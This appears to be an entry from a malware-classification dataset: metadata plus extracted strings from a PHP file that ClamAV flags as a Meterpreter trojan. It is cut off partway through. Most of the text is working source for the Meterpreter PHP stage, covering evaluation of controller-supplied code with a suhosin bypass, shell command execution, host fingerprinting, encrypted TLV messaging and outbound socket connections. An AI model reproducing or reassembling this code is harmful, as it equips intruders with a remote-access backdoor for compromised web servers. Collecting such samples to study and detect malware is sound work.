{
    "filepath": "/corpus/malware/family_4/e6c764437bd222984d09e0a9497c781fba8a18f1e047fd340452ba78165a5f24",
    "fileinfo": {
        "labels": {
            "family": "family_4",
            "software": "malware"
        },
        "md5": "0a1590cf9a3553097722857674166c5b",
        "type": "ASCII text, with very long lines, with no line terminators",
        "clamav": "Php.Trojan.MSShellcode-82",
        "blobs": null
    },
    "plugins": [
        {
            "plugin": "extractors.disassembly",
            "version": "0.1",
            "results": {}
        },
        {
            "plugin": "extractors.strings",
            "version": "0.1",
            "results": {
                "/*<?php /**/ if (!isset($GLOBALS['channels'])) { $GLOBALS['channels'] = array()": 1,
                "} if (!isset($GLOBALS['channel_process_map'])) { $GLOBALS['channel_process_map'] = array()": 1,
                "} if (!isset($GLOBALS['resource_type_map'])) { $GLOBALS['resource_type_map'] = array()": 1,
                "} if (!isset($GLOBALS['udp_host_map'])) { $GLOBALS['udp_host_map'] = array()": 1,
                "} if (!isset($GLOBALS['readers'])) { $GLOBALS['readers'] = array()": 1,
                "} if (!isset($GLOBALS['commands'])) { $GLOBALS['commands'] = array(\"core_loadlib\", \"core_machine_id\", \"core_set_uuid\", \"core_set_session_guid\", \"core_get_session_guid\", \"core_negotiate_tlv_encryption\")": 1,
                "} function register_command($c) { global $commands": 1,
                "if (! in_array($c, $commands)) { array_push($commands, $c)": 1,
                "} } function my_print($str) { } my_print(\"Evaling main meterpreter stage\")": 1,
                "function dump_array($arr, $name=null) { if (is_null($name)) { $name = \"Array\"": 1,
                "} my_print(sprintf(\"$name (%s)\", count($arr)))": 1,
                "foreach ($arr as $key => $val) { if (is_array($val)) { dump_array($val, \"{$name}[{$key}]\")": 1,
                "} else { my_print(sprintf(\" $key ($val)\"))": 1,
                "} } } function dump_readers() { global $readers": 1,
                "dump_array($readers, 'Readers')": 1,
                "} function dump_resource_map() { global $resource_type_map": 1,
                "dump_array($resource_type_map, 'Resource map')": 1,
                "} function dump_channels($extra=\"\") { global $channels": 1,
                "dump_array($channels, 'Channels '.$extra)": 1,
                "} if (!function_exists(\"file_get_contents\")) { function file_get_contents($file) { $f = @fopen($file,\"rb\")": 1,
                "$contents = false": 1,
                "if ($f) { do { $contents .= fgets($f)": 1,
                "} while (!feof($f))": 1,
                "} fclose($f)": 1,
                "return $contents": 1,
                "} } if (!function_exists('socket_set_option')) { function socket_set_option($sock, $type, $opt, $value) { socket_setopt($sock, $type, $opt, $value)": 1,
                "} } define(\"PAYLOAD_UUID\", \"\\x7c\\x34\\x08\\x67\\x71\\x74\\xdc\\x22\\x15\\x3f\\x06\\x30\\x49\\x82\\xf3\\x39\")": 1,
                "define(\"SESSION_GUID\", \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")": 1,
                "define(\"AES_256_CBC\", 'aes-256-cbc')": 1,
                "define(\"ENC_NONE\", 0)": 1,
                "define(\"ENC_AES256\", 1)": 1,
                "define(\"PACKET_TYPE_REQUEST\", 0)": 1,
                "define(\"PACKET_TYPE_RESPONSE\", 1)": 1,
                "define(\"PACKET_TYPE_PLAIN_REQUEST\", 10)": 1,
                "define(\"PACKET_TYPE_PLAIN_RESPONSE\", 11)": 1,
                "define(\"ERROR_SUCCESS\", 0)": 1,
                "define(\"ERROR_FAILURE\", 1)": 1,
                "define(\"CHANNEL_CLASS_BUFFERED\", 0)": 1,
                "define(\"CHANNEL_CLASS_STREAM\", 1)": 1,
                "define(\"CHANNEL_CLASS_DATAGRAM\", 2)": 1,
                "define(\"CHANNEL_CLASS_POOL\", 3)": 1,
                "define(\"TLV_META_TYPE_NONE\", ( 0 ))": 1,
                "define(\"TLV_META_TYPE_STRING\", (1 << 16))": 1,
                "define(\"TLV_META_TYPE_UINT\", (1 << 17))": 1,
                "define(\"TLV_META_TYPE_RAW\", (1 << 18))": 1,
                "define(\"TLV_META_TYPE_BOOL\", (1 << 19))": 1,
                "define(\"TLV_META_TYPE_QWORD\", (1 << 20))": 1,
                "define(\"TLV_META_TYPE_COMPRESSED\", (1 << 29))": 1,
                "define(\"TLV_META_TYPE_GROUP\", (1 << 30))": 1,
                "define(\"TLV_META_TYPE_COMPLEX\", (1 << 31))": 1,
                "define(\"TLV_META_TYPE_MASK\", (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16))": 1,
                "define(\"TLV_RESERVED\", 0)": 1,
                "define(\"TLV_EXTENSIONS\", 20000)": 1,
                "define(\"TLV_USER\", 40000)": 1,
                "define(\"TLV_TEMP\", 60000)": 1,
                "define(\"TLV_TYPE_ANY\", TLV_META_TYPE_NONE | 0)": 1,
                "define(\"TLV_TYPE_METHOD\", TLV_META_TYPE_STRING | 1)": 1,
                "define(\"TLV_TYPE_REQUEST_ID\", TLV_META_TYPE_STRING | 2)": 1,
                "define(\"TLV_TYPE_EXCEPTION\", TLV_META_TYPE_GROUP | 3)": 1,
                "define(\"TLV_TYPE_RESULT\", TLV_META_TYPE_UINT | 4)": 1,
                "define(\"TLV_TYPE_STRING\", TLV_META_TYPE_STRING | 10)": 1,
                "define(\"TLV_TYPE_UINT\", TLV_META_TYPE_UINT | 11)": 1,
                "define(\"TLV_TYPE_BOOL\", TLV_META_TYPE_BOOL | 12)": 1,
                "define(\"TLV_TYPE_LENGTH\", TLV_META_TYPE_UINT | 25)": 1,
                "define(\"TLV_TYPE_DATA\", TLV_META_TYPE_RAW | 26)": 1,
                "define(\"TLV_TYPE_FLAGS\", TLV_META_TYPE_UINT | 27)": 1,
                "define(\"TLV_TYPE_CHANNEL_ID\", TLV_META_TYPE_UINT | 50)": 1,
                "define(\"TLV_TYPE_CHANNEL_TYPE\", TLV_META_TYPE_STRING | 51)": 1,
                "define(\"TLV_TYPE_CHANNEL_DATA\", TLV_META_TYPE_RAW | 52)": 1,
                "define(\"TLV_TYPE_CHANNEL_DATA_GROUP\", TLV_META_TYPE_GROUP | 53)": 1,
                "define(\"TLV_TYPE_CHANNEL_CLASS\", TLV_META_TYPE_UINT | 54)": 1,
                "define(\"TLV_TYPE_SEEK_WHENCE\", TLV_META_TYPE_UINT | 70)": 1,
                "define(\"TLV_TYPE_SEEK_OFFSET\", TLV_META_TYPE_UINT | 71)": 1,
                "define(\"TLV_TYPE_SEEK_POS\", TLV_META_TYPE_UINT | 72)": 1,
                "define(\"TLV_TYPE_EXCEPTION_CODE\", TLV_META_TYPE_UINT | 300)": 1,
                "define(\"TLV_TYPE_EXCEPTION_STRING\", TLV_META_TYPE_STRING | 301)": 1,
                "define(\"TLV_TYPE_LIBRARY_PATH\", TLV_META_TYPE_STRING | 400)": 1,
                "define(\"TLV_TYPE_TARGET_PATH\", TLV_META_TYPE_STRING | 401)": 1,
                "define(\"TLV_TYPE_MACHINE_ID\", TLV_META_TYPE_STRING | 460)": 1,
                "define(\"TLV_TYPE_UUID\", TLV_META_TYPE_RAW | 461)": 1,
                "define(\"TLV_TYPE_SESSION_GUID\", TLV_META_TYPE_RAW | 462)": 1,
                "define(\"TLV_TYPE_RSA_PUB_KEY\", TLV_META_TYPE_STRING | 550)": 1,
                "define(\"TLV_TYPE_SYM_KEY_TYPE\", TLV_META_TYPE_UINT | 551)": 1,
                "define(\"TLV_TYPE_SYM_KEY\", TLV_META_TYPE_RAW | 552)": 1,
                "define(\"TLV_TYPE_ENC_SYM_KEY\", TLV_META_TYPE_RAW | 553)": 1,
                "function my_cmd($cmd) { return shell_exec($cmd)": 1,
                "} function is_windows() { return (strtoupper(substr(PHP_OS,0,3)) == \"WIN\")": 1,
                "} function core_channel_open($req, &$pkt) { $type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE)": 1,
                "my_print(\"Client wants a \". $type_tlv['value'] .\" channel, i'll see what i can do\")": 1,
                "$handler = \"channel_create_\". $type_tlv['value']": 1,
                "if ($type_tlv['value'] && is_callable($handler)) { my_print(\"Calling {$handler}\")": 1,
                "$ret = $handler($req, $pkt)": 1,
                "} else { my_print(\"I don't know how to make a \". $type_tlv['value'] .\" channel. =(\")": 1,
                "$ret = ERROR_FAILURE": 2,
                "} return $ret": 6,
                "} function core_channel_eof($req, &$pkt) { my_print(\"doing channel eof\")": 1,
                "$chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID)": 4,
                "$c = get_channel_by_id($chan_tlv['value'])": 1,
                "if ($c) { if (eof($c[1])) { packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1))": 1,
                "} else { packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0))": 1,
                "} return ERROR_SUCCESS": 6,
                "} else { return ERROR_FAILURE": 1,
                "} } function core_channel_read($req, &$pkt) { my_print(\"doing channel read\")": 1,
                "$len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH)": 2,
                "$id = $chan_tlv['value']": 4,
                "$len = $len_tlv['value']": 2,
                "$data = channel_read($id, $len)": 1,
                "if ($data === false) { $res = ERROR_FAILURE": 1,
                "} else { packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data))": 1,
                "$res = ERROR_SUCCESS": 1,
                "} return $res": 1,
                "} function core_channel_write($req, &$pkt) { $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID)": 1,
                "$data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA)": 1,
                "$data = $data_tlv['value']": 1,
                "$wrote = channel_write($id, $data, $len)": 1,
                "if ($wrote === false) { return ERROR_FAILURE": 1,
                "} else { packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, $wrote))": 1,
                "return ERROR_SUCCESS": 4,
                "} } function core_channel_close($req, &$pkt) { global $channel_process_map": 1,
                "my_print(\"doing channel close\")": 1,
                "$c = get_channel_by_id($id)": 2,
                "if ($c) { channel_close_handles($id)": 1,
                "channel_remove($id)": 1,
                "if (array_key_exists($id, $channel_process_map) and is_callable('close_process')) { close_process($channel_process_map[$id])": 1,
                "} dump_channels(\"after close\")": 1,
                "return ERROR_FAILURE": 1,
                "} function channel_close_handles($cid) { global $channels": 1,
                "if (!array_key_exists($cid, $channels)) { return": 1,
                "} $c = $channels[$cid]": 1,
                "for($i = 0": 1,
                "$i < 3": 1,
                "$i++) { if (array_key_exists($i, $c) && is_resource($c[$i])) { close($c[$i])": 1,
                "remove_reader($c[$i])": 1,
                "} } if (strlen($c['data']) == 0) { channel_remove($cid)": 1,
                "} } function channel_remove($cid) { global $channels": 1,
                "unset($channels[$cid])": 1,
                "} function core_channel_interact($req, &$pkt) { global $readers": 1,
                "my_print(\"doing channel interact\")": 1,
                "$toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL)": 1,
                "if ($c) { if ($toggle_tlv['value']) { if (!in_array($c[1], $readers)) { add_reader($c[1])": 1,
                "if (array_key_exists(2, $c) && $c[1] != $c[2]) { add_reader($c[2])": 1,
                "} $ret = ERROR_SUCCESS": 1,
                "} else { $ret = ERROR_FAILURE": 1,
                "} } else { if (in_array($c[1], $readers)) { remove_reader($c[1])": 1,
                "remove_reader($c[2])": 1,
                "$ret = ERROR_SUCCESS": 1,
                "} else { $ret = ERROR_SUCCESS": 1,
                "} } } else { my_print(\"Trying to interact with an invalid channel\")": 1,
                "} function interacting($cid) { global $readers": 1,
                "$c = get_channel_by_id($cid)": 2,
                "if (in_array($c[1], $readers)) { return true": 1,
                "} return false": 3,
                "} function core_shutdown($req, &$pkt) { my_print(\"doing core shutdown\")": 1,
                "} function core_loadlib($req, &$pkt) { global $commands": 1,
                "my_print(\"doing core_loadlib\")": 1,
                "$data_tlv = packet_get_tlv($req, TLV_TYPE_DATA)": 1,
                "if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) { return ERROR_FAILURE": 1,
                "} $tmp = $commands": 1,
                "if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $data_tlv['value'])": 1,
                "$suhosin_bypass()": 1,
                "} else { eval($data_tlv['value'])": 1,
                "} $new = array_diff($commands, $tmp)": 1,
                "foreach ($new as $meth) { packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, $meth))": 1,
                "} function core_enumextcmd($req, &$pkt) { my_print(\"doing core_enumextcmd\")": 1,
                "global $commands": 1,
                "$extension_name_tlv = packet_get_tlv($req, TLV_TYPE_STRING)": 1,
                "$expected_ext_name = $extension_name_tlv['value']": 1,
                "foreach ($commands as $ext_cmd) { list($ext_name, $cmd) = explode(\"_\", $ext_cmd, 2)": 1,
                "if ($ext_name == $expected_ext_name) { packet_add_tlv($pkt, create_tlv(TLV_TYPE_STRING, $cmd))": 1,
                "} } return ERROR_SUCCESS": 1,
                "} function core_set_uuid($req, &$pkt) { my_print(\"doing core_set_uuid\")": 1,
                "$new_uuid = packet_get_tlv($req, TLV_TYPE_UUID)": 1,
                "if ($new_uuid != null) { $GLOBALS['UUID'] = $new_uuid['value']": 1,
                "my_print(\"New UUID is {$GLOBALS['UUID']}\")": 1,
                "} function get_hdd_label() { foreach (scandir('/dev/disk/by-id/') as $file) { foreach (array(\"ata-\", \"mb-\") as $prefix) { if (strpos($file, $prefix) === 0) { return substr($file, strlen($prefix))": 1,
                "} } } return \"\"": 1,
                "} function core_negotiate_tlv_encryption($req, &$pkt) { if (supports_aes()) { my_print(\"AES functionality is supported\")": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256))": 1,
                "$GLOBALS['AES_KEY'] = rand_bytes(32)": 1,
                "if (function_exists('openssl_pkey_get_public') && function_exists('openssl_public_encrypt')) { my_print(\"Encryption via public key is supported\")": 1,
                "$pub_key_tlv = packet_get_tlv($req, TLV_TYPE_RSA_PUB_KEY)": 1,
                "if ($pub_key_tlv != null) { $key = openssl_pkey_get_public($pub_key_tlv['value'])": 1,
                "$enc = ''": 1,
                "openssl_public_encrypt($GLOBALS['AES_KEY'], $enc, $key, OPENSSL_PKCS1_PADDING)": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_ENC_SYM_KEY, $enc))": 1,
                "} } packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY, $GLOBALS['AES_KEY']))": 1,
                "} function core_get_session_guid($req, &$pkt) { packet_add_tlv($pkt, create_tlv(TLV_TYPE_SESSION_GUID, $GLOBALS['SESSION_GUID']))": 1,
                "} function core_set_session_guid($req, &$pkt) { my_print(\"doing core_set_session_guid\")": 1,
                "$new_guid = packet_get_tlv($req, TLV_TYPE_SESSION_GUID)": 1,
                "if ($new_guid != null) { $GLOBALS['SESSION_ID'] = $new_guid['value']": 1,
                "my_print(\"New Session GUID is {$GLOBALS['SESSION_GUID']}\")": 1,
                "} function core_machine_id($req, &$pkt) { my_print(\"doing core_machine_id\")": 1,
                "if (is_callable('gethostname')) { $machine_id = gethostname()": 1,
                "} else { $machine_id = php_uname('n')": 1,
                "} $serial = \"\"": 1,
                "if (is_windows()) { $output = strtolower(shell_exec(\"vol %SYSTEMDRIVE%\"))": 1,
                "$serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output)": 1,
                "} else { $serial = get_hdd_label()": 1,
                "} packet_add_tlv($pkt, create_tlv(TLV_TYPE_MACHINE_ID, $serial.\":\".$machine_id))": 1,
                "} $channels = array()": 1,
                "function register_channel($in, $out=null, $err=null) { global $channels": 1,
                "if ($out == null) { $out = $in": 1,
                "} if ($err == null) { $err = $out": 1,
                "} $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in), 'data' => '')": 1,
                "$id = end(array_keys($channels))": 1,
                "my_print(\"Created new channel $in, with id $id\")": 1,
                "return $id": 1,
                "} function get_channel_id_from_resource($resource) { global $channels": 1,
                "if (empty($channels)) { return false": 1,
                "} foreach ($channels as $i => $chan_ary) { if (in_array($resource, $chan_ary)) { my_print(\"Found channel id $i\")": 1,
                "return $i": 1,
                "} } return false": 1,
                "} function &get_channel_by_id($chan_id) { global $channels": 1,
                "my_print(\"Looking up channel id $chan_id\")": 1,
                "if (array_key_exists($chan_id, $channels)) { my_print(\"Found one\")": 1,
                "return $channels[$chan_id]": 1,
                "} else { return false": 3,
                "} } function channel_write($chan_id, $data) { $c = get_channel_by_id($chan_id)": 1,
                "if ($c && is_resource($c[0])) { my_print(\"---Writing '$data' to channel $chan_id\")": 1,
                "return write($c[0], $data)": 1,
                "} } function channel_read($chan_id, $len) { $c = &get_channel_by_id($chan_id)": 1,
                "if ($c) { $ret = substr($c['data'], 0, $len)": 1,
                "$c['data'] = substr($c['data'], $len)": 2,
                "if (strlen($ret) > 0) { my_print(\"Had some leftovers: '$ret'\")": 1,
                "} if (strlen($ret) < $len and is_resource($c[2]) and $c[1] != $c[2]) { $read = read($c[2])": 1,
                "$c['data'] .= $read": 2,
                "$bytes_needed = $len - strlen($ret)": 2,
                "$ret .= substr($c['data'], 0, $bytes_needed)": 2,
                "$c['data'] = substr($c['data'], $bytes_needed)": 2,
                "} if (strlen($ret) < $len and is_resource($c[1])) { $read = read($c[1])": 1,
                "} if (false === $read and empty($ret)) { if (interacting($chan_id)) { handle_dead_resource_channel($c[1])": 1,
                "} } function rand_xor_byte() { return chr(mt_rand(1, 255))": 1,
                "} function rand_bytes($size) { $b = ''": 1,
                "for ($i = 0": 3,
                "$i < $size": 1,
                "$i++) { $b .= rand_xor_byte()": 1,
                "} return $b": 1,
                "} function rand_xor_key() { return rand_bytes(4)": 1,
                "} function xor_bytes($key, $data) { $result = ''": 1,
                "$i < strlen($data)": 1,
                "++$i) { $result .= $data{$i} ^ $key{$i % 4}": 1,
                "} return $result": 1,
                "} function generate_req_id() { $characters = 'abcdefghijklmnopqrstuvwxyz'": 1,
                "$rid = ''": 1,
                "for ($p = 0": 1,
                "$p < 32": 1,
                "$p++) { $rid .= $characters[rand(0, strlen($characters)-1)]": 1,
                "} return $rid": 1,
                "} function supports_aes() { return function_exists('openssl_decrypt') && function_exists('openssl_encrypt')": 1,
                "} function decrypt_packet($raw) { $len_array = unpack(\"Nlen\", substr($raw, 20, 4))": 1,
                "$encrypt_flags = $len_array['len']": 1,
                "if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null) { $tlv = substr($raw, 24)": 1,
                "$dec = openssl_decrypt(substr($tlv, 24), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, substr($tlv, 8, 16))": 1,
                "return pack(\"N\", strlen($dec) + 8) . substr($tlv, 4, 4) . $dec": 1,
                "} return substr($raw, 24)": 1,
                "} function encrypt_packet($raw) { if (supports_aes() && $GLOBALS['AES_KEY'] != null) { if ($GLOBALS['AES_ENABLED'] === true) { $iv = rand_bytes(16)": 1,
                "$enc = $iv . openssl_encrypt(substr($raw, 8), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, $iv)": 1,
                "$hdr = pack(\"N\", strlen($enc) + 8) . substr($raw, 4, 4)": 1,
                "return $GLOBALS['SESSION_GUID'] . pack(\"N\", ENC_AES256) . $hdr . $enc": 1,
                "} $GLOBALS['AES_ENABLED'] = true": 1,
                "} return $GLOBALS['SESSION_GUID'] . pack(\"N\", ENC_NONE) . $raw": 1,
                "} function write_tlv_to_socket($resource, $raw) { $xor = rand_xor_key()": 1,
                "write($resource, $xor . xor_bytes($xor, encrypt_packet($raw)))": 1,
                "} function handle_dead_resource_channel($resource) { global $msgsock": 1,
                "if (!is_resource($resource)) { return": 1,
                "} $cid = get_channel_id_from_resource($resource)": 1,
                "if ($cid === false) { my_print(\"Resource has no channel: {$resource}\")": 1,
                "remove_reader($resource)": 2,
                "close($resource)": 1,
                "} else { my_print(\"Handling dead resource: {$resource}, for channel: {$cid}\")": 1,
                "channel_close_handles($cid)": 1,
                "$pkt = pack(\"N\", PACKET_TYPE_REQUEST)": 2,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'))": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()))": 2,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid))": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']))": 3,
                "$pkt = pack(\"N\", strlen($pkt) + 4) . $pkt": 3,
                "write_tlv_to_socket($msgsock, $pkt)": 1,
                "} } function handle_resource_read_channel($resource, $data) { global $udp_host_map": 1,
                "$cid = get_channel_id_from_resource($resource)": 1,
                "my_print(\"Handling data from $resource\")": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'))": 1,
                "if (array_key_exists((int)$resource, $udp_host_map)) { list($h,$p) = $udp_host_map[(int)$resource]": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_HOST, $h))": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_PORT, $p))": 1,
                "} packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid))": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data))": 1,
                "packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data)))": 1,
                "return $pkt": 2,
                "} function create_response($req) { $pkt = pack(\"N\", PACKET_TYPE_RESPONSE)": 1,
                "$method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD)": 1,
                "my_print(\"method is {$method_tlv['value']}\")": 1,
                "packet_add_tlv($pkt, $method_tlv)": 1,
                "$reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID)": 1,
                "packet_add_tlv($pkt, $reqid_tlv)": 1,
                "if (is_callable($method_tlv['value'])) { $result = $method_tlv['value']($req, $pkt)": 1,
                "} else { my_print(\"Got a request for something I don't know how to handle (\". $method_tlv['value'] .\"), returning failure\")": 1,
                "$result = ERROR_FAILURE": 1,
                "} packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result))": 1,
                "} function create_tlv($type, $val) { return array( 'type' => $type, 'value' => $val )": 1,
                "} function tlv_pack($tlv) { $ret = \"\"": 1,
                "if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) { $ret = pack(\"NNa*\", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . \"\\0\")": 1,
                "} elseif (($tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) { $hi = ($tlv['value'] >> 32) & 0xFFFFFFFF": 1,
                "$lo = $tlv['value'] & 0xFFFFFFFF": 1,
                "$ret = pack(\"NNNN\", 8 + 8, $tlv['type'], $hi, $lo)": 1,
                "} elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) { $ret = pack(\"NNN\", 8 + 4, $tlv['type'], $tlv['value'])": 1,
                "} elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) { $ret = pack(\"NN\", 8 + 1, $tlv['type'])": 1,
                "$ret .= $tlv['value'] ? \"\\x01\" : \"\\x00\"": 1,
                "} elseif (($tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) { $ret = pack(\"NN\", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']": 1,
                "} elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) { $ret = pack(\"NN\", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']": 1,
                "} elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) { $ret = pack(\"NN\", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']": 1,
                "} else { my_print(\"Don't know how to make a tlv of type \". $tlv['type'] . \" (meta type \". sprintf(\"%08x\", $tlv['type'] & TLV_META_TYPE_MASK) .\"), wtf\")": 1,
                "} function tlv_unpack($raw_tlv) { $tlv = unpack(\"Nlen/Ntype\", substr($raw_tlv, 0, 8))": 1,
                "$type = $tlv['type']": 1,
                "my_print(\"len: {$tlv['len']}, type: {$tlv['type']}\")": 1,
                "if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) { $tlv = unpack(\"Nlen/Ntype/a*value\", substr($raw_tlv, 0, $tlv['len']))": 1,
                "$tlv['value'] = str_replace(\"\\0\", \"\", $tlv['value'])": 1,
                "} elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) { $tlv = unpack(\"Nlen/Ntype/Nvalue\", substr($raw_tlv, 0, $tlv['len']))": 1,
                "} elseif (($type & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) { $tlv = unpack(\"Nlen/Ntype/Nhi/Nlo\", substr($raw_tlv, 0, $tlv['len']))": 1,
                "$tlv['value'] = $tlv['hi'] << 32 | $tlv['lo']": 1,
                "} elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) { $tlv = unpack(\"Nlen/Ntype/cvalue\", substr($raw_tlv, 0, $tlv['len']))": 1,
                "} elseif (($type & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) { $tlv = unpack(\"Nlen/Ntype\", $raw_tlv)": 1,
                "$tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8)": 1,
                "} else { my_print(\"Wtf type is this? $type\")": 1,
                "$tlv = null": 1,
                "} return $tlv": 1,
                "} function packet_add_tlv(&$pkt, $tlv) { $pkt .= tlv_pack($tlv)": 1,
                "} function packet_get_tlv($pkt, $type) { $offset = 8": 1,
                "while ($offset < strlen($pkt)) { $tlv = tlv_unpack(substr($pkt, $offset))": 2,
                "if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) { return $tlv": 1,
                "} $offset += $tlv['len']": 2,
                "} return null": 1,
                "} function packet_get_all_tlvs($pkt, $type) { my_print(\"Looking for all tlvs of type $type\")": 1,
                "$offset = 8": 1,
                "$all = array()": 1,
                "if ($tlv == NULL) { break": 1,
                "} my_print(\"len: {$tlv['len']}, type: {$tlv['type']}\")": 1,
                "if (empty($type) || $type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) { my_print(\"Found one at offset $offset\")": 1,
                "array_push($all, $tlv)": 1,
                "} return $all": 1,
                "} function register_socket($sock, $ipaddr=null, $port=null) { global $resource_type_map, $udp_host_map": 1,
                "my_print(\"Registering socket $sock for ($ipaddr:$port)\")": 1,
                "$resource_type_map[(int)$sock] = 'socket'": 1,
                "if ($ipaddr) { $udp_host_map[(int)$sock] = array($ipaddr, $port)": 1,
                "} } function register_stream($stream, $ipaddr=null, $port=null) { global $resource_type_map, $udp_host_map": 1,
                "my_print(\"Registering stream $stream for ($ipaddr:$port)\")": 1,
                "$resource_type_map[(int)$stream] = 'stream'": 1,
                "if ($ipaddr) { $udp_host_map[(int)$stream] = array($ipaddr, $port)": 1,
                "} } function connect($ipaddr, $port, $proto='tcp') { my_print(\"Doing connect($ipaddr, $port)\")": 1,
                "$sock = false": 1,
                "$ipf = AF_INET": 1,
                "$raw_ip = $ipaddr": 1,
                "if (FALSE !== strpos($ipaddr, \":\")) { $ipf = AF_INET6": 1,
                "$ipaddr = \"[\". $raw_ip .\"]\"": 1,
                "} if (is_callable('stream_socket_client')) { my_print(\"stream_socket_client({$proto}://{$ipaddr}:{$port})\")": 1,
                "if ($proto == 'ssl') { $sock = stream_socket_client(\"ssl://{$ipaddr}:{$port}\", $errno, $errstr, 5, STREAM_CLIENT_ASYNC_CONNECT)": 1,
                "if (!$sock) { return false": 5,
                "} stream_set_blocking($sock, 0)": 1,
                "register_stream($sock)": 2,
                "} elseif ($proto == 'tcp') { $sock = stream_socket_client(\"tcp://{$ipaddr}:{$port}\")": 1,
                "} register_stream($sock)": 2,
                "} elseif ($proto == 'udp') { $sock = stream_socket_client(\"udp://{$ipaddr}:{$port}\")": 1,
                "} register_stream($sock, $ipaddr, $port)": 2,
                "} } else if (is_callable('fsockopen')) { my_print(\"fsockopen\")": 1,
                "if ($proto == 'ssl') { $sock = fsockopen(\"ssl://{$ipaddr}:{$port}\")": 1,
                "stream_set_blocking($sock, 0)": 1,
                "} elseif ($proto == 'tcp') { $sock = fsockopen($ipaddr, $port)": 1,
                "} if (is_callable('socket_set_timeout')) { socket_set_timeout($sock, 2)": 1,
                "} else { $sock = fsockopen($proto.\"://\".$ipaddr,$port)": 1,
                "} } else if (is_callable('socket_create')) { my_print(\"socket_create\")": 1,
                "if ($proto == 'tcp') { $sock = socket_create($ipf, SOCK_STREAM, SOL_TCP)": 1,
                "$res = socket_connect($sock, $raw_ip, $port)": 1,
                "if (!$res) { return false": 1,
                "} register_socket($sock)": 1,
                "} elseif ($proto == 'udp') { $sock = socket_create($ipf, SOCK_DGRAM, SOL_UDP)": 1,
                "register_socket($sock, $raw_ip, $port)": 1,
                "} } return $sock": 1,
                "} function eof($resource) { $ret = false": 1,
                "switch (get_rtype($resource)) { case 'socket': break": 1,
                "case 'stream': $ret = feof($resource)": 1,
                "} function close($resource) { my_print(\"Closing resource $resource\")": 1,
                "global $resource_type_map, $udp_host_map": 1,
                "switch (get_rtype($resource)) { case 'socket': $ret = socket_close($resource)": 1,
                "case 'stream': $ret = fclose($resource)": 1,
                "} if (array_key_exists((int)$resource, $resource_type_map)) { unset($resource_type_map[(int)$resource])": 1,
                "} if (array_key_exists((int)$resource, $udp_host_map)) { my_print(\"Removing $resource from udp_host_map\")": 1,
                "unset($udp_host_map[(int)$resource])": 1,
                "} function read($resource, $len=null) { global $udp_host_map": 1,
                "if (is_null($len)) { $len = 8192": 1,
                "} $buff = ''": 1,
